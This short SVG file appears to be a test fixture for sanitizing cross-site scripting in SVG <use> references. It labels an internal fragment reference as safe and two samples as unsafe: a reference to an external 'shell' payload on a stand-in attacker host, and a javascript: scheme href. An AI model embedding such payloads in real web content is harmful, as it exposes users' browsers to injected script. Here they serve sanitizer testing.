<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
  <title>XSS via external href reference</title>
  <defs>
    <circle id="c" cx="50" cy="50" r="40"/>
  </defs>
  <!-- Safe: internal fragment reference -->
  <use href="#c" fill="green"/>
  <!-- Unsafe: external URL reference -->
  <use href="https://evil.example.com/payload.svg#shell" fill="red"/>
  <!-- Unsafe: javascript: scheme -->
  <use xlink:href="javascript:alert('xss-href')"/>
</svg>
